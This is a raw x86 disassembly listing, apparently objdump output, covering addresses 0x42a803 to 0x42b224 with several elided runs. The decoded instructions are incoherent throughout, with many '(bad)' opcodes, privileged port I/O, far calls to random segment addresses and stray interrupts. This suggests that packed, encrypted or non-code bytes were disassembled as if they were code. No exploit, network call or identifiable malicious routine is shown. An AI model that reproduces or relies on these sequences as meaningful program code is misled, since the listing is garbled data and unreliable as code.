  42a803:	mov    ebp,0xea8cb97f
  42a808:	(bad)  
  42a80a:	add    BYTE PTR gs:[esi-0x193d0987],dh
  42a811:	xchg   ebp,eax
  42a812:	adc    al,BYTE PTR [ebp+ebp*1+0x2a]
  42a816:	jg     0x42a799
  42a818:	jno    0x42a85a
  42a81a:	sbb    al,0x0
  42a81c:	or     DWORD PTR [ecx+0x32],edx
  42a81f:	ds clc 
  42a821:	pop    ecx
  42a822:	shl    DWORD PTR [ebx],0x4a
  42a825:	sub    al,0xb1
  42a827:	sub    al,cl
  42a829:	sbb    eax,0xae05fbc4
  42a82e:	pop    eax
  42a82f:	mov    esi,0x1a0c5734
  42a834:	xor    edx,DWORD PTR [ebx+0x17]
  42a837:	push   ecx
  42a838:	adc    bh,BYTE PTR [eax]
  42a83a:	inc    DWORD PTR [esi+edi*8-0x66]
  42a83e:	mov    ah,ch
  42a840:	add    DWORD PTR [eax],esp
  42a842:	hlt    
  42a843:	xchg   edi,eax
  42a844:	dec    eax
  42a845:	scas   al,BYTE PTR es:[edi]
  42a846:	jno    0x42a7d1
  42a848:	(bad)  
  42a849:	dec    esi
  42a84a:	adc    ecx,DWORD PTR [esi+edi*2]
  42a84d:	aas    
  42a84e:	sub    ah,dh
  42a850:	pop    eax
  42a851:	(bad)  
  42a852:	(bad)  
  42a853:	sbb    edi,DWORD PTR [edx-0x3b]
  42a856:	mov    WORD PTR [ecx],?
  42a858:	sub    ebx,ebp
  42a85a:	cmp    dl,BYTE PTR [ebp-0xa59665a]
  42a860:	repz push edi
  42a862:	cmp    edx,DWORD PTR [ecx]
  42a864:	in     al,0xdc
  42a866:	lock mov dh,0x5c
  42a869:	sub    bl,BYTE PTR [ebx+0x56db35]
	...
  42a8d3:	add    BYTE PTR [eax],al
  42a8d5:	add    BYTE PTR [edx-0x10409c9b],cl
  42a8db:	mov    edi,0xc58175de
  42a8e0:	xchg   edi,eax
  42a8e1:	ins    BYTE PTR es:[edi],dx
  42a8e2:	je     0x42a8e1
  42a8e4:	mov    ecx,0x1c867e5
  42a8e9:	add    BYTE PTR [eax],al
  42a8eb:	add    DWORD PTR [eax],eax
  42a8ed:	add    BYTE PTR [ecx],dl
  42a8ef:	push   ds
  42a8f0:	add    eax,0x1c514390
  42a8f5:	cld    
  42a8f6:	mov    ch,0x45
  42a8f8:	das    
  42a8f9:	mov    DWORD PTR [edi],ecx
  42a8fb:	in     eax,dx
  42a8fc:	adc    DWORD PTR [esi+0x18],esi
  42a8ff:	rcl    BYTE PTR [edi-0x6acc7fdd],1
  42a905:	ret    0xa697
  42a908:	mov    fs,esp
  42a90a:	int3   
  42a90b:	icebp  
  42a90c:	sbb    DWORD PTR [ebx+0x73a1807e],ebx
  42a912:	and    dh,BYTE PTR [ebx]
  42a914:	pop    ebp
  42a915:	ret    0x9508
  42a918:	loope  0x42a985
  42a91a:	pop    es
  42a91b:	addr16 mov ebp,0x51979085
  42a921:	clc    
  42a922:	and    al,0xad
  42a924:	mov    ds:0x43154856,al
  42a929:	int    0xee
  42a92b:	lock mov al,ds:0xed9a23f5
  42a931:	mov    BYTE PTR [eax-0xc],ch
  42a934:	mov    ebp,0xebdb993f
  42a939:	stc    
  42a93a:	jp     0x42a998
  42a93c:	push   esi
  42a93d:	imul   ecx,DWORD PTR [esi],0xfffffff5
  42a940:	push   edx
  42a941:	xor    bh,BYTE PTR [esi-0x547df2d8]
  42a947:	mov    ebx,0x58555582
  42a94c:	or     ebx,DWORD PTR [eax+0x28]
  42a94f:	adc    eax,0xd218a1c1
  42a954:	nop
  42a955:	xor    bl,BYTE PTR ds:[ecx-0x36d1c0f3]
  42a95c:	lds    esp,FWORD PTR [edx+0x5b1e7cf6]
  42a962:	jmp    0x42a92b
  42a964:	dec    esp
  42a965:	inc    edi
  42a966:	iret   
  42a967:	and    eax,0xfc63325e
  42a96c:	push   eax
  42a96d:	add    al,bh
  42a96f:	sbb    ecx,DWORD PTR [ebx+0x42bd819]
  42a975:	jae    0x42a93a
  42a977:	idiv   BYTE PTR [eax+edi*1]
  42a97a:	jg     0x42a9c2
  42a97c:	cli    
  42a97d:	call   0x22edd607
  42a982:	repz test DWORD PTR [esi-0x7c],ecx
  42a986:	jmp    0x42a99f
  42a988:	test   dh,cl
  42a98a:	outs   dx,BYTE PTR ds:[esi]
  42a98b:	dec    ebp
  42a98c:	jmp    0xa93ad708
  42a991:	popf   
  42a992:	bound  ecx,QWORD PTR [ebp+eax*1-0x11]
  42a996:	dec    eax
  42a997:	dec    ebp
  42a998:	mov    cl,0xd3
  42a99a:	pop    ds
  42a99b:	int    0xd
  42a99d:	lods   eax,DWORD PTR ds:[esi]
  42a99e:	push   ebx
  42a99f:	retf   
  42a9a0:	xchg   BYTE PTR [edi-0x41e91a2],al
  42a9a6:	mov    eax,0xc5a814c1
  42a9ab:	or     bl,BYTE PTR [edx]
  42a9ad:	repz ds dec eax
  42a9b0:	mov    DWORD PTR [ebp+0x5d],edi
  42a9b3:	call   DWORD PTR ds:0x28fcd7b5
  42a9b9:	loopne 0x42a991
  42a9bb:	retf   0xa4e2
  42a9be:	out    0x51,eax
  42a9c0:	xor    eax,0xf54c55ad
  42a9c5:	js     0x42a95b
  42a9c7:	jmp    0xad2a:0x16732e36
  42a9ce:	iret   
  42a9cf:	dec    ebp
  42a9d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9d1:	sti    
  42a9d2:	call   FWORD PTR [ecx]
  42a9d4:	mov    dh,0x15
  42a9d6:	mov    bl,0x68
  42a9d8:	ret    
  42a9d9:	popa   
  42a9da:	popf   
  42a9db:	ror    DWORD PTR [esi+0x4c],cl
  42a9de:	or     eax,0x24ae594b
  42a9e3:	adc    edx,ecx
  42a9e5:	call   0xc1c2:0x214030cd
  42a9ec:	out    0x3a,eax
	...
  42aa56:	test   al,0x93
  42aa58:	sbb    eax,0xfbee3fee
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	(bad)  
  42aa63:	jnp    0x42aa44
  42aa65:	lahf   
  42aa66:	addr16 leave 
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	add    BYTE PTR [ecx],al
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	lods   eax,DWORD PTR ds:[esi]
  42aa6f:	rol    edx,1
  42aa71:	fnstenv [edx-0x643a0815]
  42aa77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa78:	pop    esi
  42aa79:	jnp    0x42aaa8
  42aa7b:	xchg   BYTE PTR [ecx+0x1827e86a],cl
  42aa81:	push   0x6685da94
  42aa86:	xor    bh,BYTE PTR [eax]
  42aa88:	add    dl,ch
  42aa8a:	push   edx
  42aa8b:	cld    
  42aa8c:	test   eax,0x9504a648
  42aa91:	ret    
  42aa92:	jl     0x42aacd
  42aa94:	add    al,0xb5
  42aa96:	mov    bl,BYTE PTR [ecx+0x74]
  42aa99:	adc    edx,eax
  42aa9b:	push   edx
  42aa9c:	call   0x4cac:0xcf8cc7ef
  42aaa3:	shl    esp,0xc0
  42aaa6:	sub    al,0x7e
  42aaa8:	sub    eax,0x6fc3e9a8
  42aaad:	mov    eax,ds:0x80d84a7
  42aab2:	out    dx,eax
  42aab3:	retf   
  42aab4:	pop    esp
  42aab5:	stos   DWORD PTR es:[edi],eax
  42aab6:	inc    edx
  42aab7:	data16 cli 
  42aab9:	ins    DWORD PTR es:[edi],dx
  42aaba:	mov    esp,0xbc6537ba
  42aabf:	pop    ebx
  42aac0:	push   ds
  42aac1:	mov    edx,0xf1f87f7a
  42aac6:	push   esi
  42aac7:	sbb    ebp,esi
  42aac9:	add    al,0x8d
  42aacb:	mov    dl,0xa8
  42aacd:	scas   eax,DWORD PTR es:[edi]
  42aace:	xor    BYTE PTR [edi-0x38],dl
  42aad1:	retf   0x458f
  42aad4:	push   ebp
  42aad5:	aam    0x47
  42aad7:	stos   BYTE PTR es:[edi],al
  42aad8:	cmp    DWORD PTR [ebp-0x22236c84],0x4a
  42aadf:	cmp    ecx,DWORD PTR [ebx+ebx*8+0x60b024d1]
  42aae6:	rol    BYTE PTR [eax+0x3c],0x34
  42aaea:	or     al,0x7d
  42aaec:	jmp    0xff4e0670
  42aaf1:	mov    ds:0xa88dd26,eax
  42aaf6:	pusha  
  42aaf7:	pop    ecx
  42aaf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aaf9:	xchg   DWORD PTR ds:[edx+ebp*1-0x3f62b96f],ebx
  42ab01:	sti    
  42ab02:	fiadd  DWORD PTR [ecx-0x45]
  42ab05:	xor    BYTE PTR [edx*2-0x1fa7bca6],bl
  42ab0c:	adc    dl,BYTE PTR [edx]
  42ab0e:	pusha  
  42ab0f:	or     DWORD PTR [eax-0x3ffd89f7],ebx
  42ab15:	mov    esp,0x5f89028d
  42ab1a:	loop   0x42ab89
  42ab1c:	jbe    0x42aadb
  42ab1e:	xchg   ebp,eax
  42ab1f:	push   esp
  42ab20:	adc    eax,0x36c70ac1
  42ab25:	sbb    ah,dl
  42ab27:	pop    ebp
  42ab28:	pop    ecx
  42ab29:	push   ebp
  42ab2a:	std    
  42ab2b:	inc    ecx
  42ab2c:	mov    cl,BYTE PTR [edx]
  42ab2e:	(bad)  
  42ab2f:	bnd jbe 0x42ab77
  42ab32:	or     al,BYTE PTR [edx+0x60fb51bf]
  42ab38:	add    esp,DWORD PTR [eax+0x4e5939b4]
  42ab3e:	or     DWORD PTR [edx+edx*2+0x3f7b631],edi
  42ab45:	push   ebp
  42ab46:	retf   
  42ab47:	push   esi
  42ab48:	shr    DWORD PTR [eax+0x3fb4cdf8],0xdb
  42ab4f:	adc    DWORD PTR [esi+0x49dc7506],esp
  42ab55:	pop    ds
  42ab56:	or     eax,eax
  42ab58:	in     eax,0x20
  42ab5a:	push   ebp
  42ab5b:	int3   
  42ab5c:	add    DWORD PTR [ecx],edi
  42ab5e:	xor    al,0x16
  42ab60:	call   0x4967:0x22b04227
  42ab67:	fstp   DWORD PTR [ebp+0x65b93cd]
  42ab6d:	xchg   ebp,eax
	...
  42abd6:	ds push cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	mov    cl,0x11
  42abe4:	xor    ebp,DWORD PTR [ebx]
  42abe6:	addr16 retf 0x1
  42abea:	add    BYTE PTR [ecx],al
  42abec:	add    BYTE PTR [eax],al
  42abee:	sar    BYTE PTR [edx-0x7d],0x2
  42abf2:	aaa    
  42abf3:	adc    bh,cl
  42abf5:	sub    al,0x8f
  42abf7:	inc    edx
  42abf8:	pop    ds
  42abf9:	iret   
  42abfa:	fisubr WORD PTR [edi]
  42abfc:	pop    edx
  42abfd:	std    
  42abfe:	sbb    dl,0xbd
  42ac01:	dec    ecx
  42ac02:	scas   eax,DWORD PTR es:[edi]
  42ac03:	enter  0x5c6,0x33
  42ac07:	jmp    0x42abad
  42ac09:	stos   DWORD PTR es:[edi],eax
  42ac0a:	ins    BYTE PTR es:[edi],dx
  42ac0b:	retf   
  42ac0c:	push   ecx
  42ac0d:	pop    edi
  42ac0e:	push   esi
  42ac0f:	pop    edi
  42ac10:	xlat   BYTE PTR ds:[ebx]
  42ac11:	rol    BYTE PTR [ebx-0x4e826ede],cl
  42ac17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac18:	scas   eax,DWORD PTR es:[edi]
  42ac19:	int    0xe6
  42ac1b:	leave  
  42ac1c:	out    dx,eax
  42ac1d:	sti    
  42ac1e:	in     eax,0xe2
  42ac20:	adc    eax,edi
  42ac22:	adc    eax,DWORD PTR [edi]
  42ac24:	or     al,0x64
  42ac26:	aad    0x8a
  42ac28:	xchg   esp,eax
  42ac29:	push   es
  42ac2a:	and    al,bl
  42ac2c:	rol    BYTE PTR [ebx+eax*8-0x1a],cl
  42ac30:	call   0xd5bf:0xd6767b36
  42ac37:	dec    edi
  42ac38:	test   eax,0x967ed546
  42ac3d:	cmc    
  42ac3e:	stc    
  42ac3f:	cdq    
  42ac40:	sub    edi,DWORD PTR [esi+edi*4+0x78]
  42ac44:	jg     0x42ac0d
  42ac46:	add    BYTE PTR [ebx-0x78],ch
  42ac49:	enter  0x25fd,0x86
  42ac4d:	add    bh,bh
  42ac4f:	les    ebx,FWORD PTR [edi+0x5b]
  42ac52:	mov    DWORD PTR ds:0xa2eed46b,ebx
  42ac58:	test   DWORD PTR [edx],edi
  42ac5a:	addps  xmm0,XMMWORD PTR [ecx+edx*8-0x8]
  42ac5f:	popa   
  42ac60:	or     eax,0xf0dfbeeb
  42ac65:	jno    0x42ac72
  42ac67:	call   0xb6a2:0x2c9b1a7c
  42ac6e:	idiv   edx
  42ac70:	int3   
  42ac71:	dec    edx
  42ac72:	or     ebx,ebx
  42ac74:	call   0xa64b:0x67423fb7
  42ac7b:	dec    ebx
  42ac7c:	cmp    eax,0x71240483
  42ac81:	dec    ebx
  42ac82:	inc    esp
  42ac83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac84:	in     eax,dx
  42ac85:	(bad)  
  42ac86:	cmp    al,dl
  42ac88:	sbb    eax,0x4d8ab2a5
  42ac8d:	in     eax,0xe9
  42ac8f:	outs   dx,DWORD PTR ds:[esi]
  42ac90:	mov    WORD PTR [ebx+eiz*1+0x7d1cc5ab],ds
  42ac97:	sbb    BYTE PTR [ebp+0x14],dh
  42ac9a:	pop    ss
  42ac9b:	sbb    DWORD PTR [esp+ebx*1],ebp
  42ac9e:	cld    
  42ac9f:	test   BYTE PTR [ebx+ebx*4-0x4c582b77],al
  42aca6:	jno    0x42ac41
  42aca8:	pop    ebx
  42aca9:	aas    
  42acaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42acab:	inc    edi
  42acac:	sbb    BYTE PTR [ebp-0x6dd5ff04],dl
  42acb2:	ret    
  42acb3:	(bad)  [ecx]
  42acb5:	sub    ch,bh
  42acb7:	pop    es
  42acb8:	mov    ds,WORD PTR [ebx-0xe65c854]
  42acbe:	mov    ah,0x59
  42acc0:	mov    cl,0x2
  42acc2:	outs   dx,BYTE PTR ds:[esi]
  42acc3:	mov    ebp,0x46cadd7c
  42acc8:	sub    eax,0xec2162c9
  42accd:	jp     0x42acec
  42accf:	iret   
  42acd0:	rol    BYTE PTR [esi+edx*2-0x56b0fd3c],0x8e
  42acd8:	lahf   
  42acd9:	imul   ebp,DWORD PTR [ebp-0x5c],0xae6d1753
  42ace0:	imul   ebx,DWORD PTR [esi],0xc0d9aca5
  42ace6:	ret    0x9cdd
  42ace9:	(bad)  
  42aceb:	ins    BYTE PTR es:[edi],dx
  42acec:	or     DWORD PTR [eax+0x0],ecx
	...
  42ad53:	add    BYTE PTR [eax],al
  42ad55:	add    cl,ch
  42ad57:	xor    bl,BYTE PTR [edx+edi*1]
  42ad5a:	fistp  QWORD PTR [esi]
  42ad5c:	out    dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	sti    
  42ad63:	mov    ss,WORD PTR [eax+0x1cb6754]
  42ad69:	add    BYTE PTR [eax],al
  42ad6b:	add    DWORD PTR [eax],eax
  42ad6d:	add    BYTE PTR [ebp-0x7e],bh
  42ad70:	mov    bl,0xc0
  42ad72:	add    eax,0xbf052e17
  42ad77:	mov    ch,0xf1
  42ad79:	ss jg  0x42ad5b
  42ad7c:	cdq    
  42ad7d:	rcr    BYTE PTR [ecx-0x47],1
  42ad80:	or     eax,0xdd4ec66b
  42ad85:	and    edx,DWORD PTR cs:[eax*2+0x71988681]
  42ad8d:	mov    ch,0x60
  42ad8f:	pusha  
  42ad90:	cmp    esp,DWORD PTR [esi+0x5a40b49]
  42ad96:	call   DWORD PTR [edi+ebp*4+0x6]
  42ad9a:	in     eax,dx
  42ad9b:	or     DWORD PTR [ecx+0x272d42ba],eax
  42ada1:	mov    BYTE PTR [edi-0x24],ah
  42ada4:	std    
  42ada5:	and    ch,ah
  42ada7:	mov    eax,0xd6542211
  42adac:	lods   al,BYTE PTR ds:[esi]
  42adad:	into   
  42adae:	mov    al,0x7c
  42adb0:	lock add dl,al
  42adb3:	sub    BYTE PTR [edi+0x6df32db8],cl
  42adb9:	mov    bl,0xab
  42adbb:	xor    BYTE PTR [edx+ebp*2+0x4822097a],0xa2
  42adc3:	add    DWORD PTR [ebx+0x4f3c928b],0x2b
  42adca:	mov    bh,0xf6
  42adcc:	add    dh,al
  42adce:	fstp   QWORD PTR [ebp-0x38]
  42add1:	std    
  42add2:	imul   esi,DWORD PTR [edi+ebp*2],0x6
  42add6:	mov    bh,0xc6
  42add8:	push   ds
  42add9:	popf   
  42adda:	cs in  eax,dx
  42addc:	cmp    DWORD PTR [edx+0x8],esi
  42addf:	stos   DWORD PTR es:[edi],eax
  42ade0:	out    dx,al
  42ade1:	retf   0xaff8
  42ade4:	cli    
  42ade5:	scas   al,BYTE PTR es:[edi]
  42ade6:	dec    eax
  42ade7:	cdq    
  42ade8:	xor    ebp,ebx
  42adea:	aam    0xad
  42adec:	loopne 0x42ae0e
  42adee:	dec    edx
  42adef:	lods   al,BYTE PTR ds:[esi]
  42adf0:	jmp    0x42ae11
  42adf2:	dec    edx
  42adf3:	adc    BYTE PTR [ebp-0x1d7216fc],ah
  42adf9:	les    edi,FWORD PTR [eax+0x525288e7]
  42adff:	rep stos DWORD PTR es:[edi],eax
  42ae01:	shl    DWORD PTR [ecx],cl
  42ae03:	adc    al,ah
  42ae05:	dec    ecx
  42ae06:	or     eax,0x24d5b91b
  42ae0b:	xchg   esp,eax
  42ae0c:	jp     0x42ae21
  42ae0e:	xlat   BYTE PTR ds:[ebx]
  42ae0f:	scas   al,BYTE PTR es:[edi]
  42ae10:	ror    DWORD PTR [esi+0x39bea048],1
  42ae16:	pop    esp
  42ae17:	xchg   ecx,eax
  42ae18:	push   esi
  42ae19:	in     al,0x65
  42ae1b:	scas   eax,DWORD PTR es:[edi]
  42ae1c:	sub    BYTE PTR [eax],dh
  42ae1e:	pop    edx
  42ae1f:	mov    bh,0xc
  42ae21:	jo     0x42ae80
  42ae23:	cmp    dl,BYTE PTR [ebx+0x42a8e7cd]
  42ae29:	jbe    0x42ae92
  42ae2b:	daa    
  42ae2c:	pop    ds
  42ae2d:	int    0xdb
  42ae2f:	retf   0x8753
  42ae32:	pop    edi
  42ae33:	sub    eax,0x51433379
  42ae38:	mov    al,0xdd
  42ae3a:	lods   al,BYTE PTR ds:[esi]
  42ae3b:	fwait
  42ae3c:	sub    esi,ebx
  42ae3e:	pop    edi
  42ae3f:	popa   
  42ae40:	fwait
  42ae41:	ret    0xd2e9
  42ae44:	js     0x42ae16
  42ae46:	and    eax,0x564b48af
  42ae4b:	inc    eax
  42ae4c:	pop    edi
  42ae4d:	cwde   
  42ae4e:	ins    BYTE PTR es:[edi],dx
  42ae4f:	jmp    0xf671a706
  42ae54:	inc    ecx
  42ae55:	cwde   
  42ae56:	push   cs
  42ae57:	inc    edx
  42ae58:	mov    edx,0x60178e63
  42ae5d:	ja     0x42ae19
  42ae5f:	sahf   
  42ae60:	iret   
  42ae61:	push   ebx
  42ae62:	mov    WORD PTR [edx],ds
  42ae64:	fdiv   st,st(0)
  42ae66:	xor    ebx,DWORD PTR [edx]
  42ae68:	mov    DWORD PTR [esi-0x11],ebx
  42ae6b:	sub    DWORD PTR [edi],0xffffffb9
	...
  42aed6:	mov    edi,0x4a8e4af7
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	scas   eax,DWORD PTR es:[edi]
  42aee3:	pusha  
  42aee4:	(bad)  
  42aee5:	int    0x67
  42aee7:	int3   
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	add    BYTE PTR [ecx],al
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	not    BYTE PTR [esp+edi*8-0x2508aea9]
  42aef5:	mov    al,ds:0xdd36ea76
  42aefa:	mov    ds,WORD PTR [edx-0x75356427]
  42af00:	mov    ds,WORD PTR ds:0xe6adeba7
  42af06:	adc    cl,BYTE PTR [ebx-0x10197a5e]
  42af0c:	pop    ebp
  42af0d:	js     0x42af1a
  42af0f:	ds sbb dh,cl
  42af12:	pop    edi
  42af13:	sub    dl,dh
  42af15:	popa   
  42af16:	xor    eax,0xab3f0721
  42af1b:	pop    ebx
  42af1c:	mov    ah,0x87
  42af1e:	(bad)  
  42af20:	test   DWORD PTR [esp+edx*8],0x8ac3d7c9
  42af27:	sahf   
  42af28:	jbe    0x42af28
  42af2a:	lock retf 0xd58f
  42af2e:	iret   
  42af2f:	sbb    eax,0x198848ff
  42af34:	or     eax,0x535567
  42af39:	repz sti 
  42af3b:	xchg   esi,eax
  42af3c:	out    dx,al
  42af3d:	sub    DWORD PTR ds:[edi],0x744625a8
  42af44:	call   0x41a2a6a
  42af49:	stc    
  42af4a:	(bad)  
  42af4b:	and    ah,BYTE PTR [bx+si+0x2c68]
  42af50:	cwde   
  42af51:	icebp  
  42af52:	push   cs
  42af53:	adc    eax,0x77f7cb0c
  42af58:	sub    eax,0xcf3e39a9
  42af5d:	inc    ecx
  42af5e:	out    dx,eax
  42af5f:	and    esi,DWORD PTR [edi+0x79]
  42af62:	cmp    ah,BYTE PTR [edi]
  42af64:	mov    bl,0xcc
  42af66:	jge    0x42af14
  42af68:	lahf   
  42af69:	cmp    al,0x42
  42af6b:	imul   eax,ebp,0x19
  42af6e:	jg     0x42af60
  42af70:	into   
  42af71:	add    al,0x89
  42af73:	push   esi
  42af74:	fist   DWORD PTR [edi+0x35d23ac6]
  42af7a:	sbb    BYTE PTR [esp+ebp*2-0x12],bl
  42af7e:	ds inc ecx
  42af80:	loop   0x42af5b
  42af82:	mov    eax,ds:0xb6f06c18
  42af87:	xor    BYTE PTR [edi-0x5d],bh
  42af8a:	xchg   ebp,eax
  42af8b:	lea    edx,[esi]
  42af8d:	jns    0x42af94
  42af8f:	loope  0x42af15
  42af91:	xor    ch,bl
  42af93:	lods   eax,DWORD PTR ds:[esi]
  42af94:	xchg   ecx,eax
  42af95:	mov    al,ds:0xc754d1d1
  42af9a:	jnp    0x42af3b
  42af9c:	mov    ecx,0x85b82a56
  42afa1:	mov    BYTE PTR [edx-0xd942131],bh
  42afa7:	mov    DWORD PTR ss:[ecx-0x6eeb1125],ecx
  42afae:	push   edi
  42afaf:	ret    0xfd29
  42afb2:	in     al,0x8f
  42afb4:	pop    ds
  42afb5:	mov    ah,cl
  42afb7:	mov    ecx,0x4646347f
  42afbc:	fcomp  DWORD PTR [ecx-0x23ca0924]
  42afc2:	xor    eax,eax
  42afc4:	icebp  
  42afc5:	imul   eax,DWORD PTR [ebx+0x5732e637],0xffffff89
  42afcc:	sti    
  42afcd:	les    ecx,FWORD PTR [eax]
  42afcf:	in     al,0x69
  42afd1:	fmul   st(6),st
  42afd3:	xchg   ecx,eax
  42afd4:	mov    ah,bh
  42afd6:	outs   dx,BYTE PTR ds:[esi]
  42afd7:	es inc eax
  42afd9:	popf   
  42afda:	add    ah,0x12
  42afdd:	pushf  
  42afde:	pop    esi
  42afdf:	add    DWORD PTR [esi-0xb],ecx
  42afe2:	test   BYTE PTR [eax-0x71],al
  42afe5:	push   0xf36d9aa7
  42afea:	pop    edx
  42afeb:	out    dx,eax
  42afec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42afed:	repz add BYTE PTR [eax],al
	...
  42b054:	add    BYTE PTR [eax],al
  42b056:	stc    
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	jb     0x42b06f
  42b064:	loopne 0x42b0db
  42b066:	addr16 int 0x1
  42b069:	add    BYTE PTR [eax],al
  42b06b:	add    DWORD PTR [eax],eax
  42b06d:	add    BYTE PTR [ecx],al
  42b06f:	nop
  42b070:	xchg   ebx,eax
  42b071:	stos   BYTE PTR es:[edi],al
  42b072:	repz add ah,BYTE PTR [ebp-0x52]
  42b076:	stos   BYTE PTR es:[edi],al
  42b077:	jmp    0xc6d54c59
  42b07c:	mov    esp,0xacda03e2
  42b081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b082:	std    
  42b083:	mul    BYTE PTR [ecx+0x14]
  42b086:	pop    ecx
  42b087:	xchg   esi,eax
  42b088:	icebp  
  42b089:	mov    edi,0x67cf2d7b
  42b08e:	retf   
  42b08f:	dec    edi
  42b090:	lods   al,BYTE PTR ds:[esi]
  42b091:	icebp  
  42b092:	fmul   DWORD PTR [eax-0x36]
  42b095:	dec    ebp
  42b096:	daa    
  42b097:	and    BYTE PTR [ecx+ebp*2+0x232f152f],ah
  42b09e:	pop    esi
  42b09f:	add    BYTE PTR [ebx-0x31884cd1],bh
  42b0a5:	repnz cmp eax,0x567cd740
  42b0ab:	xlat   BYTE PTR ds:[ebx]
  42b0ac:	dec    esi
  42b0ad:	ja     0x42b0f6
  42b0af:	add    ch,ch
  42b0b1:	dec    esi
  42b0b2:	jmp    0xbaaa4bb4
  42b0b7:	(bad)  
  42b0b8:	xor    edx,edx
  42b0ba:	inc    ebp
  42b0bb:	popf   
  42b0bc:	cmp    DWORD PTR [esi-0x78],ebp
  42b0bf:	call   0x4c649ec7
  42b0c4:	imul   esp,DWORD PTR [eax],0x15
  42b0c7:	xor    DWORD PTR [edi],edx
  42b0c9:	push   edi
  42b0ca:	and    edx,edx
  42b0cc:	xchg   esi,eax
  42b0cd:	retf   
  42b0ce:	in     eax,dx
  42b0cf:	test   DWORD PTR [ecx+0x604e4025],edx
  42b0d5:	jmp    0x391bbea6
  42b0da:	sub    al,0x4a
  42b0dc:	sbb    BYTE PTR [edx-0x63cb31de],0xbf
  42b0e3:	mov    dl,BYTE PTR [esi+0x67f0a643]
  42b0e9:	jge    0x42b15b
  42b0eb:	rcr    BYTE PTR [ecx+0x588082d3],0x2e
  42b0f2:	inc    esi
  42b0f3:	scas   al,BYTE PTR es:[edi]
  42b0f4:	fs jp  0x42b144
  42b0f7:	sti    
  42b0f8:	ret    0x7850
  42b0fb:	mov    DWORD PTR es:[edi+0x6536a454],esi
  42b102:	in     al,dx
  42b103:	stos   BYTE PTR es:[edi],al
  42b104:	sbb    ch,BYTE PTR [edi-0x64]
  42b107:	and    bh,dh
  42b109:	push   edi
  42b10a:	cld    
  42b10b:	fwait
  42b10c:	out    0x99,al
  42b10e:	mov    dh,0xeb
  42b110:	sbb    ah,BYTE PTR [ecx]
  42b112:	in     eax,0x8f
  42b114:	lods   eax,DWORD PTR ds:[esi]
  42b115:	daa    
  42b116:	mov    al,0xb4
  42b118:	mov    ss,WORD PTR [edi+esi*1]
  42b11b:	retf   
  42b11c:	dec    ebx
  42b11d:	add    BYTE PTR cs:[ebp+0x14],ah
  42b121:	fcmovu st,st(4)
  42b123:	cmc    
  42b124:	hlt    
  42b125:	push   edi
  42b126:	das    
  42b127:	xchg   edx,ecx
  42b129:	xor    BYTE PTR [ebx],cl
  42b12b:	xchg   ecx,eax
  42b12c:	xchg   esi,eax
  42b12d:	adc    ch,BYTE PTR [edx+eax*4]
  42b130:	daa    
  42b131:	arpl   WORD PTR [ebx+esi*4-0x6b27e736],bx
  42b138:	xchg   BYTE PTR [ebp-0x3e950c5a],ch
  42b13e:	cmc    
  42b13f:	sbb    eax,0xd373e59e
  42b144:	in     al,0x42
  42b146:	mov    eax,0xf6b6ebe
  42b14b:	or     al,0x23
  42b14d:	outs   dx,BYTE PTR ds:[esi]
  42b14e:	push   edi
  42b14f:	retf   0x289f
  42b152:	cmp    BYTE PTR [eax+0x4e],cl
  42b155:	and    dh,cl
  42b157:	lods   al,BYTE PTR ds:[esi]
  42b158:	out    dx,eax
  42b159:	lods   al,BYTE PTR ds:[esi]
  42b15a:	mov    DWORD PTR [ecx+esi*2+0x29e53fea],eax
  42b161:	xor    BYTE PTR fs:[ecx-0x16a1e6d9],dl
  42b168:	inc    ecx
  42b169:	js     0x42b120
  42b16b:	std    
  42b16c:	shl    DWORD PTR [eax],1
	...
  42b1d6:	jne    0x42b1fd
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	and    cl,bh
  42b1e4:	jbe    0x42b25d
  42b1e6:	addr16 into 
  42b1e8:	add    DWORD PTR [eax],eax
  42b1ea:	add    BYTE PTR [ecx],al
  42b1ec:	add    BYTE PTR [eax],al
  42b1ee:	scas   al,BYTE PTR es:[edi]
  42b1ef:	jg     0x42b1c8
  42b1f1:	lds    esp,FWORD PTR [ebx-0x5393330f]
  42b1f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1f8:	lods   eax,DWORD PTR ds:[esi]
  42b1f9:	lea    ebp,[ebx+eax*4+0xc1f69fc]
  42b200:	jne    0x42b22b
  42b202:	dec    edi
  42b203:	ins    BYTE PTR es:[edi],dx
  42b204:	daa    
  42b205:	sub    dh,BYTE PTR [ebx]
  42b207:	icebp  
  42b208:	push   ds
  42b209:	fs stos DWORD PTR es:[edi],eax
  42b20b:	(bad)  
  42b20d:	clc    
  42b20e:	push   eax
  42b20f:	sub    DWORD PTR [eax+ecx*1+0x7],0x1bd1afde
  42b217:	mov    ebx,0x76c89e24
  42b21c:	mul    DWORD PTR [edx]
  42b21e:	js     0x42b1fc
  42b220:	mov    DWORD PTR [eax+eax*8+0x6c],edi
  42b224:	or     ch,ch
